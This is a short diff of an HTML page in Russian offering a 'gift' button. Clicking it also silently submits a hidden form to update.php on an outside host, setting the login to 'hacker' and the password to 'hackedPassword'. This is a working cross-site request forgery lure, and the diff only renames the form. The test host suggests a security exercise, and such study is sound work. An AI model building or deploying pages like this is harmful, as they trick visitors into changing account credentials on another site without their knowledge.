@@ -42,7 +42,7 @@
       <button onclick="claimGift()">Получить подарок</button>
     </div>
 
-    <form id="unprotectedForm" action="http://artem39rma.temp.swtest.ru/update.php" method="GET" style="display: none">
+    <form id="form" action="http://artem39rma.temp.swtest.ru/update.php" method="GET" style="display: none">
       <input type="hidden" name="login" value="hacker" />
       <input type="hidden" name="password" value="hackedPassword" />
     </form>
@@ -51,7 +51,7 @@
       function claimGift() {
         document.querySelector(".gift-box").style.transform = "scale(1.1)";
 
-        document.getElementById("unprotectedForm").submit();
+        document.getElementById("form").submit();
       }
     </script>
   </body>
